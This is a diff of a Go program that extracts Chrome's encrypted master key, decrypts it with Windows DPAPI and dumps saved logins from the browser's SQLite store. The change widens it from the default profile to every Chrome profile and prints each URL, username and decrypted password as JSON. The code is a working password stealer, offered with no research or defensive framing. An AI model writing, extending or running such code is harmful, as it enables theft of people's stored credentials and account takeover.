@@ -1,6 +1,3 @@
-```gcc should be installed```
-```PS : $env:CGO_ENABLED="1"; go build -o chrome_decrypt_full.exe full_decrypt_chrome.go ```
-
 package main
 
 import (
@@ -34,7 +31,6 @@ func getMasterKey() ([]byte, error) {
 		return nil, err
 	}
 
-	// Extract base64 encrypted key from JSON
 	var localState map[string]interface{}
 	json.Unmarshal(data, &localState)
 	encKeyB64 := localState["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
@@ -44,10 +40,8 @@ func getMasterKey() ([]byte, error) {
 		return nil, err
 	}
 
-	// Remove "DPAPI" prefix
-	encKey = encKey[5:]
+	encKey = encKey[5:] // remove DPAPI prefix
 
-	// Decrypt using Windows DPAPI
 	var outBlob windows.DataBlob
 	inBlob := windows.DataBlob{
 		Size: uint32(len(encKey)),
@@ -102,53 +96,69 @@ func main() {
 	}
 	fmt.Printf("[+] AES Key (hex): %s\n", hex.EncodeToString(aesKey))
 
-	loginDataPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
-	tmpPath := filepath.Join(os.TempDir(), "LoginData_copy.db")
-	input, err := os.ReadFile(loginDataPath)
+	userDataPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
+	dirs, err := os.ReadDir(userDataPath)
 	if err != nil {
-		fmt.Println("[!] Failed to read Login Data:", err)
+		fmt.Println("[!] Failed to list Chrome profiles:", err)
 		return
 	}
-	os.WriteFile(tmpPath, input, 0600)
 
-	db, err := sql.Open("sqlite3", tmpPath)
-	if err != nil {
-		fmt.Println("[!] Failed to open database:", err)
-		return
-	}
-	defer db.Close()
+	var allResults []LoginEntry
 
-	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
-	if err != nil {
-		fmt.Println("[!] Query failed:", err)
-		return
-	}
-	defer rows.Close()
+	for _, dir := range dirs {
+		profilePath := filepath.Join(userDataPath, dir.Name())
+		loginDataPath := filepath.Join(profilePath, "Login Data")
 
-	var results []LoginEntry
+		if _, err := os.Stat(loginDataPath); err != nil {
+			continue // skip if not found
+		}
 
-	for rows.Next() {
-		var url, username string
-		var encPwd []byte
-
-		err = rows.Scan(&url, &username, &encPwd)
+		tmpPath := filepath.Join(os.TempDir(), dir.Name()+"_LoginData_copy.db")
+		input, err := os.ReadFile(loginDataPath)
 		if err != nil {
+			fmt.Println("[!] Failed to read Login Data for", dir.Name(), ":", err)
+			continue
+		}
+		os.WriteFile(tmpPath, input, 0600)
+
+		db, err := sql.Open("sqlite3", tmpPath)
+		if err != nil {
+			fmt.Println("[!] Failed to open DB for", dir.Name(), ":", err)
 			continue
 		}
 
-		decPwd, err := decryptPassword(encPwd, aesKey)
+		rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
 		if err != nil {
+			fmt.Println("[!] Query failed for", dir.Name(), ":", err)
+			db.Close()
 			continue
 		}
 
-		entry := LoginEntry{
-			URL:      url,
-			Username: username,
-			Password: decPwd,
+		for rows.Next() {
+			var url, username string
+			var encPwd []byte
+
+			err = rows.Scan(&url, &username, &encPwd)
+			if err != nil {
+				continue
+			}
+
+			decPwd, err := decryptPassword(encPwd, aesKey)
+			if err != nil {
+				continue
+			}
+
+			entry := LoginEntry{
+				URL:      url,
+				Username: username,
+				Password: decPwd,
+			}
+			allResults = append(allResults, entry)
 		}
-		results = append(results, entry)
+		rows.Close()
+		db.Close()
 	}
 
-	jsonOutput, _ := json.MarshalIndent(results, "", "  ")
+	jsonOutput, _ := json.MarshalIndent(allResults, "", "  ")
 	fmt.Println(string(jsonOutput))
 }
